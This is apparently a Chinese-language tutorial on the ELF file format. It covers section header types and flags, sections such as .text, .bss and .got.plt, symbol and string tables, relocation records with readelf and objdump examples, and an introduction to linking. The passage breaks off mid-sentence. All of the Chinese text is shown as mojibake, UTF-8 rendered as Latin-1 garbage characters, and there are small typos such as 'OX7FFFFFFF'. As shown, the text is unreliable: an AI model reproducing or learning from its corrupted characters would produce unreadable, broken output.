è¡¨ç¤ºæ²¡æœ‰å¯¹é½çº¦æŸã€‚ sh_entsize æŸäº›èŠ‚åŒºä¸­å­˜åœ¨å…·æœ‰å›ºå®šå¤§å°çš„è¡¨é¡¹çš„è¡¨ï¼Œå¦‚ç¬¦å·è¡¨ã€‚å¯¹äºè¿™ç±»èŠ‚åŒºï¼Œè¯¥æˆå‘˜ç»™å‡ºæ¯ä¸ªè¡¨é¡¹çš„å­—èŠ‚å¤§å°ã€‚åä¹‹ï¼Œæ­¤æˆå‘˜å–å€¼ä¸º 0ã€‚ # sh_type èŠ‚ç±»å‹ç›®å‰æœ‰ä¸‹åˆ—å¯é€‰èŒƒå›´ï¼Œå…¶ä¸­ SHT æ˜¯ Section Header Table çš„ç®€å†™ã€‚ åç§° å–å€¼ è¯´æ˜ SHT_NULL 0 è¯¥ç±»å‹èŠ‚åŒºæ˜¯éæ´»åŠ¨çš„ï¼Œè¿™ç§ç±»å‹çš„èŠ‚å¤´ä¸­çš„å…¶å®ƒæˆå‘˜å–å€¼æ— æ„ä¹‰ã€‚ SHT_PROGBITS 1 è¯¥ç±»å‹èŠ‚åŒºåŒ…å«ç¨‹åºå®šä¹‰çš„ä¿¡æ¯ï¼Œå®ƒçš„æ ¼å¼å’Œå«ä¹‰éƒ½ç”±ç¨‹åºæ¥å†³å®šã€‚ SHT_SYMTAB 2 è¯¥ç±»å‹èŠ‚åŒºåŒ…å«ä¸€ä¸ªç¬¦å·è¡¨ï¼ˆSYMbol TABleï¼‰ã€‚ç›®å‰ç›®æ ‡æ–‡ä»¶å¯¹æ¯ç§ç±»å‹çš„èŠ‚åŒºéƒ½åª èƒ½åŒ…å«ä¸€ä¸ªï¼Œä¸è¿‡è¿™ä¸ªé™åˆ¶å°†æ¥å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ ä¸€èˆ¬ï¼ŒSHT_SYMTAB èŠ‚åŒºæä¾›ç”¨äºé“¾æ¥ç¼–è¾‘ï¼ˆæŒ‡ ld è€Œè¨€ï¼‰ çš„ç¬¦å·ï¼Œå°½ç®¡ä¹Ÿå¯ç”¨æ¥å®ç°åŠ¨æ€é“¾æ¥ã€‚ SHT_STRTAB 3 è¯¥ç±»å‹èŠ‚åŒºåŒ…å«å­—ç¬¦ä¸²è¡¨ï¼ˆ STRing TABle ï¼‰ã€‚ SHT_RELA 4 è¯¥ç±»å‹èŠ‚åŒºåŒ…å«æ˜¾å¼æŒ‡å®šä½æ•°çš„é‡å®šä½é¡¹ï¼ˆ RELocation entry with Addends ï¼‰ï¼Œä¾‹å¦‚ï¼Œ32 ä½ç›®æ ‡æ–‡ä»¶ä¸­çš„ Elf32_Rela ç±»å‹ã€‚æ­¤å¤–ï¼Œç›®æ ‡æ–‡ä»¶å¯èƒ½æ‹¥æœ‰å¤šä¸ªé‡å®šä½èŠ‚åŒºã€‚ SHT_HASH 5 è¯¥ç±»å‹èŠ‚åŒºåŒ…å«ç¬¦å·å“ˆå¸Œè¡¨ï¼ˆ HASH table ï¼‰ã€‚ SHT_DYNAMIC 6 è¯¥ç±»å‹èŠ‚åŒºåŒ…å«åŠ¨æ€é“¾æ¥çš„ä¿¡æ¯ï¼ˆ DYNAMIC linking ï¼‰ã€‚ SHT_NOTE 7 è¯¥ç±»å‹èŠ‚åŒºåŒ…å«ä»¥æŸç§æ–¹å¼æ ‡è®°æ–‡ä»¶çš„ä¿¡æ¯ï¼ˆNOTEï¼‰ã€‚ SHT_NOBITS 8 è¯¥ç±»å‹èŠ‚åŒºä¸å ç”¨æ–‡ä»¶çš„ç©ºé—´ï¼Œå…¶å®ƒæ–¹é¢å’Œ SHT_PROGBITS ç›¸ä¼¼ã€‚å°½ç®¡è¯¥ç±»å‹èŠ‚åŒºä¸åŒ…å«ä»»ä½•å­—èŠ‚ï¼Œå…¶å¯¹åº”çš„èŠ‚å¤´æˆå‘˜ sh_offset ä¸­è¿˜æ˜¯ä¼šåŒ…å«æ¦‚å¿µæ€§çš„æ–‡ä»¶åç§»ã€‚ SHT_REL 9 è¯¥ç±»å‹èŠ‚åŒºåŒ…å«é‡å®šä½è¡¨é¡¹ï¼ˆRELocation entry without Addendsï¼‰ï¼Œä¸è¿‡å¹¶æ²¡æœ‰æŒ‡å®šä½æ•°ã€‚ä¾‹å¦‚ï¼Œ32 ä½ç›®æ ‡æ–‡ä»¶ä¸­çš„ Elf32_rel ç±»å‹ã€‚ç›®æ ‡æ–‡ä»¶ä¸­å¯ä»¥æ‹¥æœ‰å¤šä¸ªé‡å®šä½èŠ‚åŒºã€‚ SHT_SHLIB 10 è¯¥ç±»å‹æ­¤èŠ‚åŒºè¢«ä¿ç•™ï¼Œä¸è¿‡å…¶è¯­ä¹‰å°šæœªè¢«å®šä¹‰ã€‚ SHT_DYNSYM 11 ä½œä¸ºä¸€ä¸ªå®Œæ•´çš„ç¬¦å·è¡¨ï¼Œå®ƒå¯èƒ½åŒ…å«å¾ˆå¤šå¯¹åŠ¨æ€é“¾æ¥è€Œè¨€ä¸å¿… è¦çš„ç¬¦å·ã€‚å› æ­¤ï¼Œç›®æ ‡æ–‡ä»¶ä¹Ÿå¯ä»¥åŒ…å«ä¸€ä¸ª SHT_DYNSYM èŠ‚åŒºï¼Œå…¶ä¸­ä¿å­˜åŠ¨æ€é“¾æ¥ç¬¦å·çš„ä¸€ä¸ªæœ€å°é›†åˆï¼Œä»¥èŠ‚çœç©ºé—´ã€‚ SHT_LOPROC 0X70000000 æ­¤å€¼æŒ‡å®šä¿ç•™ç»™å¤„ç†å™¨ä¸“ç”¨è¯­ä¹‰çš„ä¸‹ç•Œï¼ˆ LOw PROCessor-specific semantics ï¼‰ã€‚ SHT_HIPROC OX7FFFFFFF æ­¤å€¼æŒ‡å®šä¿ç•™ç»™å¤„ç†å™¨ä¸“ç”¨è¯­ä¹‰çš„ä¸Šç•Œï¼ˆ HIgh PROCessor-specific semantics ï¼‰ã€‚ SHT_LOUSER 0X80000000 æ­¤å€¼æŒ‡å®šä¿ç•™ç»™åº”ç”¨ç¨‹åºçš„ç´¢å¼•ä¸‹ç•Œã€‚ SHT_HIUSER 0X8FFFFFFF æ­¤å€¼æŒ‡å®šä¿ç•™ç»™åº”ç”¨ç¨‹åºçš„ç´¢å¼•ä¸Šç•Œã€‚ # sh_flags èŠ‚å¤´ä¸­ sh_flags å­—æ®µçš„æ¯ä¸€ä¸ªæ¯”ç‰¹ä½éƒ½å¯ä»¥ç»™å‡ºå…¶ç›¸åº”çš„æ ‡è®°ä¿¡æ¯ï¼Œå…¶å®šä¹‰äº†å¯¹åº”çš„èŠ‚åŒºçš„å†…å®¹æ˜¯å¦å¯ä»¥è¢«ä¿®æ”¹ã€è¢«æ‰§è¡Œç­‰ä¿¡æ¯ã€‚å¦‚æœä¸€ä¸ªæ ‡å¿—ä½è¢«è®¾ç½®ï¼Œåˆ™è¯¥ä½å–å€¼ä¸º 1ï¼Œæœªå®šä¹‰çš„ä½éƒ½ä¸º 0ã€‚ç›®å‰å·²å®šä¹‰å€¼å¦‚ä¸‹ï¼Œå…¶ä»–å€¼ä¿ç•™ã€‚ åç§° å€¼ è¯´æ˜ SHF_WRITE 0x1 è¿™ç§èŠ‚åŒ…å«äº†è¿›ç¨‹è¿è¡Œè¿‡ç¨‹ä¸­å¯ä»¥è¢«å†™çš„æ•°æ®ã€‚ SHF_ALLOC 0x2 è¿™ç§èŠ‚åœ¨è¿›ç¨‹è¿è¡Œæ—¶å ç”¨å†…å­˜ã€‚å¯¹äºä¸å ç”¨ç›®æ ‡æ–‡ä»¶çš„å†…å­˜é•œåƒç©ºé—´çš„æŸäº›æ§åˆ¶èŠ‚ï¼Œè¯¥å±æ€§å¤„äºå…³é—­çŠ¶æ€ (off)ã€‚ SHF_EXECINSTR 0x4 è¿™ç§èŠ‚åŒ…å«å¯æ‰§è¡Œçš„æœºå™¨æŒ‡ä»¤ï¼ˆEXECutable INSTRuctionï¼‰ã€‚ SHF_MASKPROC 0xf0000000 æ‰€æœ‰åœ¨è¿™ä¸ªæ©ç ä¸­çš„æ¯”ç‰¹ä½ç”¨äºç‰¹å®šå¤„ç†å™¨è¯­ä¹‰ã€‚ # sh_link &amp; sh_info å½“èŠ‚åŒºç±»å‹çš„ä¸åŒçš„æ—¶å€™ï¼Œsh_link å’Œ sh_info ä¹Ÿä¼šå…·æœ‰ä¸åŒçš„å«ä¹‰ã€‚ sh_type sh_link sh_info SHT_DYNAMIC èŠ‚åŒºä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²è¡¨çš„èŠ‚å¤´ç´¢å¼• 0 SHT_HASH æ­¤å“ˆå¸Œè¡¨æ‰€ä½¿ç”¨çš„ç¬¦å·è¡¨çš„èŠ‚å¤´ç´¢å¼• 0 SHT_REL/SHT_RELA ä¸ç¬¦å·è¡¨ç›¸å…³çš„èŠ‚å¤´ç´¢å¼• é‡å®šä½åº”ç”¨åˆ°çš„èŠ‚çš„èŠ‚å¤´ç´¢å¼• SHT_SYMTAB/SHT_DYNSYM æ“ä½œç³»ç»Ÿç‰¹å®šä¿¡æ¯ï¼ŒLinux ä¸­çš„ ELF æ–‡ä»¶ä¸­è¯¥é¡¹æŒ‡å‘ç¬¦å·è¡¨ä¸­ç¬¦å·æ‰€å¯¹åº”çš„å­—ç¬¦ä¸²èŠ‚åŒºåœ¨ Section Header Table ä¸­çš„åç§»ã€‚ æ“ä½œç³»ç»Ÿç‰¹å®šä¿¡æ¯ other SHN_UNDEF 0 # ELF sections # èŠ‚çš„åˆ†ç±» # .text èŠ‚ .text èŠ‚æ˜¯ä¿å­˜äº†ç¨‹åºä»£ç æŒ‡ä»¤çš„ä»£ç èŠ‚ã€‚ä¸€æ®µå¯æ‰§è¡Œç¨‹åºï¼Œå¦‚æœå­˜åœ¨ Phdrï¼Œåˆ™ .text èŠ‚å°±ä¼šå­˜åœ¨äº text æ®µä¸­ã€‚ç”±äº .text èŠ‚ä¿å­˜äº†ç¨‹åºä»£ç ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º SHT_PROGBITS ã€‚ # .rodata èŠ‚ rodata èŠ‚ä¿å­˜äº†åªè¯»çš„æ•°æ®ï¼Œå¦‚ä¸€è¡Œ C è¯­è¨€ä»£ç ä¸­çš„å­—ç¬¦ä¸²ã€‚ç”±äº .rodata èŠ‚æ˜¯åªè¯»çš„ï¼Œæ‰€ä»¥åªèƒ½å­˜åœ¨äºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„åªè¯»æ®µä¸­ã€‚å› æ­¤ï¼Œåªèƒ½åœ¨ text æ®µï¼ˆä¸æ˜¯ data æ®µï¼‰ä¸­æ‰¾åˆ° .rodata èŠ‚ã€‚ç”±äº .rodata èŠ‚æ˜¯åªè¯»çš„ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º SHT_PROGBITS ã€‚ # .plt èŠ‚ï¼ˆè¿‡ç¨‹é“¾æ¥è¡¨ï¼‰ .plt èŠ‚ä¹Ÿç§°ä¸ºè¿‡ç¨‹é“¾æ¥è¡¨ï¼ˆProcedure Linkage Tableï¼‰ï¼Œå…¶åŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨è°ƒç”¨ä»å…±äº«åº“å¯¼å…¥çš„å‡½æ•°æ‰€å¿…éœ€çš„ç›¸å…³ä»£ç ã€‚ç”±äº .plt èŠ‚ä¿å­˜äº†ä»£ç ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º SHT_PROGBITS ã€‚ # .data èŠ‚ .data èŠ‚å­˜åœ¨äº data æ®µä¸­ï¼Œå…¶ä¿å­˜äº†åˆå§‹åŒ–çš„å…¨å±€å˜é‡ç­‰æ•°æ®ã€‚ç”±äº .data èŠ‚ä¿å­˜äº†ç¨‹åºçš„å˜é‡æ•°æ®ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º SHT_PROGBITS ã€‚ # .bss èŠ‚ .bss èŠ‚å­˜åœ¨äº data æ®µä¸­ï¼Œå ç”¨ç©ºé—´ä¸è¶…è¿‡ 4 å­—èŠ‚ï¼Œä»…è¡¨ç¤ºè¿™ä¸ªèŠ‚æœ¬çœçš„ç©ºé—´ã€‚ .bss èŠ‚ä¿å­˜äº†æœªè¿›è¡Œåˆå§‹åŒ–çš„å…¨å±€æ•°æ®ã€‚ç¨‹åºåŠ è½½æ—¶æ•°æ®è¢«åˆå§‹åŒ–ä¸º 0ï¼Œåœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´å¯ä»¥è¿›è¡Œèµ‹å€¼ã€‚ç”±äº .bss èŠ‚æœªä¿å­˜å®é™…çš„æ•°æ®ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º SHT_NOBITS ã€‚ # .got.plt èŠ‚ï¼ˆå…¨å±€åç§»è¡¨ - è¿‡ç¨‹é“¾æ¥è¡¨ï¼‰ .got èŠ‚ä¿å­˜äº†å…¨å±€åç§»è¡¨ã€‚ .got èŠ‚å’Œ .plt èŠ‚ä¸€èµ·æä¾›äº†å¯¹å¯¼å…¥çš„å…±äº«åº“å‡½æ•°çš„è®¿é—®å…¥å£ï¼Œç”±åŠ¨æ€é“¾æ¥å™¨åœ¨è¿è¡Œæ—¶è¿›è¡Œä¿®æ”¹ã€‚ç”±äº .got.plt èŠ‚ä¸ç¨‹åºæ‰§è¡Œæœ‰å…³ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º SHT_PROGBITS ã€‚ # .dynsym èŠ‚ï¼ˆåŠ¨æ€é“¾æ¥ç¬¦å·è¡¨ï¼‰ .dynsym èŠ‚ä¿å­˜åœ¨ text æ®µä¸­ã€‚å…¶ä¿å­˜äº†ä»å…±äº«åº“å¯¼å…¥çš„åŠ¨æ€ç¬¦å·è¡¨ã€‚èŠ‚ç±»å‹ä¸º SHT_DYNSYM ã€‚ # .dynstr èŠ‚ï¼ˆåŠ¨æ€é“¾æ¥å­—ç¬¦ä¸²è¡¨ï¼‰ .dynstr ä¿å­˜äº†åŠ¨æ€é“¾æ¥å­—ç¬¦ä¸²è¡¨ï¼Œè¡¨ä¸­å­˜æ”¾äº†ä¸€ç³»åˆ—å­—ç¬¦ä¸²ï¼Œè¿™äº›å­—ç¬¦ä¸²ä»£è¡¨äº†ç¬¦å·åç§°ï¼Œä»¥ç©ºå­—ç¬¦ä½œä¸ºç»ˆæ­¢ç¬¦ã€‚ # .rel.* èŠ‚ï¼ˆé‡å®šä½è¡¨ï¼‰ é‡å®šä½è¡¨ä¿å­˜äº†é‡å®šä½ç›¸å…³çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æè¿°äº†å¦‚ä½•åœ¨é“¾æ¥æˆ–è¿è¡Œæ—¶ï¼Œå¯¹ ELF ç›®æ ‡æ–‡ä»¶çš„æŸéƒ¨åˆ†æˆ–è€…è¿›ç¨‹é•œåƒè¿›è¡Œè¡¥å……æˆ–ä¿®æ”¹ã€‚ç”±äºé‡å®šä½è¡¨ä¿å­˜äº†é‡å®šä½ç›¸å…³çš„æ•°æ®ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º SHT_REL ã€‚ # .hash èŠ‚ .hash èŠ‚ä¹Ÿç§°ä¸º .gnu.hash ï¼Œå…¶ä¿å­˜äº†ä¸€ä¸ªç”¨äºæŸ¥æ‰¾ç¬¦å·çš„æ•£åˆ—è¡¨ã€‚ # .symtab èŠ‚ï¼ˆç¬¦å·è¡¨ï¼‰ .symtab èŠ‚æ˜¯ä¸€ä¸ª ElfN_Sym çš„æ•°ç»„ï¼Œä¿å­˜äº†ç¬¦å·ä¿¡æ¯ã€‚èŠ‚ç±»å‹ä¸º SHT_SYMTAB ã€‚ # .strtab èŠ‚ï¼ˆå­—ç¬¦ä¸²è¡¨ï¼‰ .strtab èŠ‚ä¿å­˜çš„æ˜¯ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼Œè¡¨ä¸­çš„å†…å®¹ä¼šè¢« .symtab çš„ ElfN_Sym ç»“æ„ä¸­çš„ st_name å¼•ç”¨ã€‚èŠ‚ç±»å‹ä¸º SHT_STRTAB ã€‚ # .ctors èŠ‚å’Œ.dtors èŠ‚ .ctors ï¼ˆæ„é€ å™¨ï¼‰èŠ‚å’Œ .dtors ï¼ˆææ„å™¨ï¼‰èŠ‚åˆ†åˆ«ä¿å­˜äº†æŒ‡å‘æ„é€ å‡½æ•°å’Œææ„å‡½æ•°çš„å‡½æ•°æŒ‡é’ˆï¼Œæ„é€ å‡½æ•°æ˜¯åœ¨ main å‡½æ•°æ‰§è¡Œä¹‹å‰éœ€è¦æ‰§è¡Œçš„ä»£ç ï¼›ææ„å‡½æ•°æ˜¯åœ¨ main å‡½æ•°ä¹‹åéœ€è¦æ‰§è¡Œçš„ä»£ç ã€‚ # ç¬¦å·è¡¨ ç¬¦å·æ˜¯å¯¹æŸäº›ç±»å‹çš„æ•°æ®æˆ–ä»£ç ï¼ˆå¦‚å…¨å±€å˜é‡æˆ–å‡½æ•°ï¼‰çš„ç¬¦å·å¼•ç”¨ï¼Œå‡½æ•°åæˆ–å˜é‡åå°±æ˜¯ç¬¦å·åã€‚ä¾‹å¦‚ï¼Œ printf() å‡½æ•°ä¼šåœ¨åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨ .dynsym ä¸­å­˜æœ‰ä¸€ä¸ªæŒ‡å‘è¯¥å‡½æ•°çš„ç¬¦å·é¡¹ï¼ˆä»¥ Elf_Sym æ•°æ®ç»“æ„è¡¨ç¤ºï¼‰ã€‚åœ¨å¤§å¤šæ•°å…±äº«åº“å’ŒåŠ¨æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œå­˜åœ¨ä¸¤ä¸ªç¬¦å·è¡¨ã€‚å³ .dynsym å’Œ .symtab ã€‚ .dynsym ä¿å­˜äº†å¼•ç”¨æ¥è‡ªå¤–éƒ¨æ–‡ä»¶ç¬¦å·çš„å…¨å±€ç¬¦å·ã€‚å¦‚ printf åº“å‡½æ•°ã€‚ .dynsym ä¿å­˜çš„ç¬¦å·æ˜¯ .symtab æ‰€ä¿å­˜ç¬¦åˆçš„å­é›†ï¼Œ .symtab ä¸­è¿˜ä¿å­˜äº†å¯æ‰§è¡Œæ–‡ä»¶çš„æœ¬åœ°ç¬¦å·ã€‚å¦‚å…¨å±€å˜é‡ï¼Œä»£ç ä¸­å®šä¹‰çš„æœ¬åœ°å‡½æ•°ç­‰ã€‚ æ—¢ç„¶ .dynsym æ˜¯ .symtab çš„å­é›†ï¼Œé‚£ä¸ºä½•è¦åŒæ—¶å­˜åœ¨ä¸¤ä¸ªç¬¦å·è¡¨å‘¢ï¼Ÿ é€šè¿‡ readelf -S å‘½ä»¤å¯ä»¥æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶çš„è¾“å‡ºï¼Œä¸€éƒ¨åˆ†èŠ‚æ ‡å¿—ä½ï¼ˆ sh_flags ï¼‰è¢«æ ‡è®°ä¸ºäº† Aï¼ˆALLOCï¼‰ã€WAï¼ˆWRITE/ALLOCï¼‰ã€AXï¼ˆALLOC/EXECï¼‰ã€‚å…¶ä¸­ï¼Œ .dynsym è¢«æ ‡è®°ä¸º ALLOCï¼Œè€Œ .symtab åˆ™æ²¡æœ‰æ ‡è®°ã€‚ ALLOC è¡¨ç¤ºæœ‰è¯¥æ ‡è®°çš„èŠ‚ä¼šåœ¨è¿è¡Œæ—¶åˆ†é…å¹¶è£…è½½è¿›å…¥å†…å­˜ï¼Œè€Œ .symtab ä¸æ˜¯åœ¨è¿è¡Œæ—¶å¿…éœ€çš„ï¼Œå› æ­¤ä¸ä¼šè¢«è£…è½½åˆ°å†…å­˜ä¸­ã€‚ .dynsym ä¿å­˜çš„ç¬¦å·åªèƒ½åœ¨è¿è¡Œæ—¶è¢«è§£æï¼Œå› æ­¤æ˜¯è¿è¡Œæ—¶åŠ¨æ€é“¾æ¥å™¨æ‰€éœ€çš„å”¯ä¸€ç¬¦å·ã€‚ .dynsym å¯¹äºåŠ¨æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶çš„æ‰§è¡Œæ˜¯å¿…éœ€çš„ï¼Œè€Œ .symtab åªæ˜¯ç”¨æ¥è¿›è¡Œè°ƒè¯•å’Œé“¾æ¥çš„ã€‚ ä¸Šå›¾æ‰€ç¤ºä¸ºé€šè¿‡ç¬¦å·è¡¨ç´¢å¼•å­—ç¬¦ä¸²è¡¨çš„ç¤ºæ„å›¾ã€‚ç¬¦å·è¡¨ä¸­çš„æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ª Elf_Sym ç»“æ„ï¼Œå¯¹åº”å¯ä»¥åœ¨å­—ç¬¦ä¸²è¡¨ä¸­ç´¢å¼•å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚è¯¥æ•°æ®ç»“æ„ä¸­æˆå‘˜çš„å«ä¹‰å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š æˆå‘˜ å«ä¹‰ st_name ç¬¦å·åã€‚è¯¥å€¼ä¸ºè¯¥ç¬¦å·ååœ¨å­—ç¬¦ä¸²è¡¨ä¸­çš„åç§»åœ°å€ã€‚ st_value ç¬¦å·å¯¹åº”çš„å€¼ã€‚å­˜æ”¾ç¬¦å·çš„å€¼ï¼ˆå¯èƒ½æ˜¯åœ°å€æˆ–ä½ç½®åç§»é‡ï¼‰ã€‚ st_size ç¬¦å·çš„å¤§å°ã€‚ st_other 0 st_shndx ç¬¦å·æ‰€åœ¨çš„èŠ‚ st_info ç¬¦å·ç±»å‹åŠç»‘å®šå±æ€§ ä½¿ç”¨ readelf å·¥å…·æˆ‘ä»¬ä¹Ÿèƒ½å¤Ÿçœ‹åˆ°ç¬¦å·è¡¨çš„ç›¸å…³ä¿¡æ¯ã€‚ $ readelf -s hello.o Symbol table '.symtab' contains 11 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FILE LOCAL DEFAULT ABS hello.c 2: 0000000000000000 0 SECTION LOCAL DEFAULT 1 3: 0000000000000000 0 SECTION LOCAL DEFAULT 3 4: 0000000000000000 0 SECTION LOCAL DEFAULT 4 5: 0000000000000000 0 SECTION LOCAL DEFAULT 5 6: 0000000000000000 0 SECTION LOCAL DEFAULT 7 7: 0000000000000000 0 SECTION LOCAL DEFAULT 8 8: 0000000000000000 0 SECTION LOCAL DEFAULT 6 9: 0000000000000000 21 FUNC GLOBAL DEFAULT 1 main 10: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND puts # å­—ç¬¦ä¸²è¡¨ ç±»ä¼¼äºç¬¦å·è¡¨ï¼Œåœ¨å¤§å¤šæ•°å…±äº«åº“å’ŒåŠ¨æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œä¹Ÿå­˜åœ¨ä¸¤ä¸ªå­—ç¬¦ä¸²è¡¨ã€‚å³ .dynstr å’Œ .strtab ï¼Œåˆ†åˆ«å¯¹åº”äº .dynsym å’Œ symtab ã€‚æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ª .shstrtab çš„èŠ‚å¤´å­—ç¬¦ä¸²è¡¨ï¼Œç”¨äºä¿å­˜èŠ‚å¤´è¡¨ä¸­ç”¨åˆ°çš„å­—ç¬¦ä¸²ï¼Œå¯é€šè¿‡ sh_name è¿›è¡Œç´¢å¼•ã€‚ ELF æ–‡ä»¶ä¸­æ‰€æœ‰å­—ç¬¦è¡¨çš„ç»“æ„åŸºæœ¬ä¸€è‡´ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚ # é‡å®šä½è¡¨ é‡å®šä½å°±æ˜¯å°†ç¬¦å·å®šä¹‰å’Œç¬¦å·å¼•ç”¨è¿›è¡Œè¿æ¥çš„è¿‡ç¨‹ã€‚å¯é‡å®šä½æ–‡ä»¶éœ€è¦åŒ…å«æè¿°å¦‚ä½•ä¿®æ”¹èŠ‚å†…å®¹çš„ç›¸å…³ä¿¡æ¯ï¼Œä»è€Œä½¿å¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶èƒ½å¤Ÿä¿å­˜è¿›ç¨‹çš„ç¨‹åºé•œåƒæ‰€éœ€è¦çš„æ­£ç¡®ä¿¡æ¯ã€‚ é‡å®šä½è¡¨æ˜¯è¿›è¡Œé‡å®šä½çš„é‡è¦ä¾æ®ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ objdump å·¥å…·æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„é‡å®šä½è¡¨ï¼š $ objdump -r hello.o hello.o: file format elf64-x86-64 RELOCATION RECORDS FOR [.text]: OFFSET TYPE VALUE 0000000000000005 R_X86_64_32 .rodata 000000000000000a R_X86_64_PC32 puts-0x0000000000000004 RELOCATION RECORDS FOR [.eh_frame]: OFFSET TYPE VALUE 0000000000000020 R_X86_64_PC32 .text é‡å®šä½è¡¨æ˜¯ä¸€ä¸ª Elf_Rel ç±»å‹çš„æ•°ç»„ç»“æ„ï¼Œæ¯ä¸€é¡¹å¯¹åº”ä¸€ä¸ªéœ€è¦è¿›è¡Œé‡å®šä½çš„é¡¹ã€‚ å…¶æˆå‘˜å«ä¹‰å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š æˆå‘˜ å«ä¹‰ r_offset é‡å®šä½å…¥å£çš„åç§»ã€‚å¯¹äºå¯é‡å®šä½æ–‡ä»¶æ¥è¯´ï¼Œè¿™ä¸ªå€¼æ˜¯è¯¥é‡å®šä½å…¥å£æ‰€è¦ä¿®æ­£çš„ä½ç½®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ç›¸å¯¹äºèŠ‚èµ·å§‹çš„åç§»ï¼›å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«å¯¹è±¡æ–‡ä»¶æ¥è¯´ï¼Œè¿™ä¸ªå€¼æ˜¯è¯¥é‡å®šä½å…¥å£æ‰€è¦ä¿®æ­£çš„ä½ç½®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„è™šæ‹Ÿåœ°å€ r_info é‡å®šä½å…¥å£çš„ç±»å‹å’Œç¬¦å·ã€‚å› ä¸ºä¸åŒå¤„ç†å™¨çš„æŒ‡ä»¤ç³»ç»Ÿä¸ä¸€æ ·ï¼Œæ‰€ä»¥é‡å®šä½æ‰€è¦ä¿®æ­£çš„æŒ‡ä»¤åœ°å€æ ¼å¼ä¹Ÿä¸ä¸€æ ·ã€‚æ¯ç§å¤„ç†å™¨éƒ½æœ‰è‡ªå·±çš„ä¸€å¥—é‡å®šä½å…¥å£çš„ç±»å‹ã€‚å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶æ¥è¯´ï¼Œå®ƒä»¬çš„é‡å®šä½å…¥å£æ˜¯åŠ¨æ€é“¾æ¥ç±»å‹çš„ã€‚ é‡å®šä½æ˜¯ç›®æ ‡æ–‡ä»¶é“¾æ¥æˆä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„å…³é”®ã€‚ # ELF çš„é“¾æ¥è¿‡ç¨‹ æ­¤å¤„çš„å†…å®¹æ¥æºäºè®¡ç®—æœºé‚£äº›äº‹ (5)â€”â€” é“¾æ¥ã€é™æ€é“¾æ¥ã€åŠ¨æ€é“¾æ¥ï¼Œä»…ä½œå­¦ä¹ è®°å½•å’Œå¤‡ä»½ç”¨ # é“¾æ¥æ¦‚è¿° æ¨¡å—åŒ–è®¾è®¡æ˜¯è½¯ä»¶å¼€å‘ä¸­æœ€å¸¸ç”¨çš„è®¾è®¡æ€æƒ³ã€‚é“¾æ¥ï¼ˆLinkingï¼‰ æœ¬è´¨ä¸Šå°±æ˜¯æŠŠå„ä¸ªæ¨¡å—ä¹‹é—´ç›¸äº’å¼•ç”¨çš„éƒ¨åˆ†å¤„ç†å¥½ï¼Œä½¿å¾—å„ä¸ªæ¨¡å—ä¹‹é—´èƒ½å¤Ÿæ­£ç¡®è¡”æ¥ã€‚æ¯”å¦‚ï¼š æˆ‘ä»¬åœ¨æ¨¡å— main.c ä¸­ä½¿ç”¨å¦ä¸€ä¸ªæ¨¡å— func.c ä¸­çš„ foo() å‡½æ•°ã€‚æˆ‘ä»¬åœ¨ main.c æ¨¡å—ä¸­æ¯ä¸€å¤„è°ƒç”¨ foo æ—¶éƒ½å¿…é¡»ç¡®åˆ‡çŸ¥é“ foo å‡½æ•°çš„åœ°å€ã€‚ä½†ç”±äºæ¯ä¸ªæ¨¡å—éƒ½æ˜¯å•ç‹¬ç¼–è¯‘çš„ã€‚ç¼–è¯‘å™¨åœ¨ç¼–è¯‘ main.c çš„æ—¶å€™å¹¶ä¸çŸ¥é“ foo å‡½æ•°çš„åœ°å€ã€‚æ‰€ä»¥ç¼–è¯‘å™¨ä¼šæš‚æ—¶æŠŠè¿™äº›è°ƒç”¨ foo çš„æŒ‡ä»¤çš„ç›®æ ‡åœ°å€æç½®ï¼Œç­‰å¾…æœ€åé“¾æ¥æ—¶ç”±é“¾æ¥å™¨å°†è¿™äº›æŒ‡ä»¤çš„ç›®æ ‡åœ°å€ä¿®æ­£ã€‚è¿™å°±æ˜¯é™æ€é“¾æ¥æœ€åŸºæœ¬çš„è¿‡ç¨‹å’Œä½œç”¨ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºä¸ºæœ€åŸºæœ¬çš„é™æ€é“¾æ¥è¿‡ç¨‹ç¤ºæ„å›¾ã€‚æ¯ä¸ªæ¨¡å—çš„æºä»£ç æ–‡ä»¶ï¼ˆå¦‚ .c 